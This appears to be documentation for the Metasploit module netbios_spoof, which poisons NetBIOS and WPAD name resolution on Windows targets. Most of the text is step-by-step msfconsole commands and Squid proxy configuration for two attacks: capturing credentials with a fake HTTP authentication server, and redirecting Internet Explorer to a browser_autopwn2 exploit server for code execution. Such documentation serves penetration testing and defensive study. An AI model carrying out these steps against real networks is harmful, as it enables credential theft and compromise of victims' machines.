netbios_spoof continuously spams NetBIOS responses to a target for given hostname, causing the
target to cache a malicious address for this name. By default, the module will attempt to poison
WPAD, forcing the target system to communicate with a fake server that can be leveraged to steal
sensitive information, or obtain arbitrary code execution.

## Vulnerable Application

Windows is the most ideal target because it supports WPAD by default.

## Options

**NBADDR**

The address that the NetBIOS name (NBNAME) should resolve to.

**NBNAME**

The NetBIOS name to spoof a reply for.

**PPSRATE**

The rate at which to send NetBIOS replies.

## Scenarios

**Credential Collection Attack Using Targeted NetBIOS Spoofing:**

The following example uses http_basic, but other modules (such as http_ntlm) also applies.

Step 1: Start the first Metasploit instance:

1. ```rvmsudo ./msfconsole -q```
2. ```use auxiliary/server/capture/http_basic```
3. ```set REALM google.com```
4. ```set URIPATH /```
5. ```run```

Step 2: Start the second Metasploit instance:

1. ```rvmsudo ./msfconsole -q```
2. ```use auxiliary/admin/netbios/netbios_spoof```
3. ```set NBADDR [IP to fake HTTP auth server]```
4. ```set PPSRATE 30000```
5. ```set RHOST [Target Host]```
6. ```run```

Step 3: On the victim machine:

1. Make sure IE automatically detects settings (under LAN settings)
2. Start IE, as soon as it opens, IE should try to authenticate.

If the spoofed name has already been cached, you can do this to flush. And then next time IE will
be asked for credentials again.

```
ipconfig /flushdns
```

**Arbitrary Code Execution Using Targeted NetBIOS Spoofing:**

The following example will spoof WPAD and causes google.com to redirect to an exploit server.

Step 1: Start the first Metasploit instance:

1. ```rvmsudo ./msfconsole -q```
2. ```use auxiliary/server/browser_autopwn2```
3. ```set SRVPORT 8181```
4. ```run```

Remember the BrowserAutoPwn URL, you will need this info for the proxy configuration file.

Step 2: Install [Squid](http://www.squid-cache.org/) Proxy server (or [SquidMan](http://squidman.net/squidman/) if you use OS X), and edit the configuration file:

First, uncomment these settings if they are found in the file:

* http_access deny all
* http_access deny !Safe_ports
* http_access deny CONNECT !SSL_ports
* http_access deny to_localhost
* http_access deny all
* always_direct deny all

Second, add the following (make sure the change MyNetwork setting, and update the BrowserAutoPwn
URL field:

```
acl MyNetwork src 192.168.1.0/24
acl BLKSite dstdomain .google.com
deny_info [BrowserAutoPwn URL] all
http_reply_access deny BLKSite all
http_access allow MyNetwork
```

Step 3: Start the second Metasploit instance:

1. ```rvmsudo ./msfconsole -q```
2. ```use auxiliary/server/wpad```
3. ```set PROXY [Proxy IP]```
4. ```set PROXYPORT 8080```
5. ```run```

Step 4: Start the third Metasploit instance:

1. ```rvmsudo ./msfconsole -q```
2. ```use auxiliary/admin/netbios/netbios_spoof```
3. ```set NBADDR [IP to fake HTTP server]```
4. ```set PPSRATE 30000```
5. ```set RHOST [Target Host]```
6. ```run```

Step 5: On the victim machine:

1. Make sure IE automatically detects settings (under LAN settings)
2. Start IE
3. Go to google.com, IE should end up loading the exploit server.

If the spoofed name has already been cached, you can do this to flush.

```
ipconfig /flushdns
```

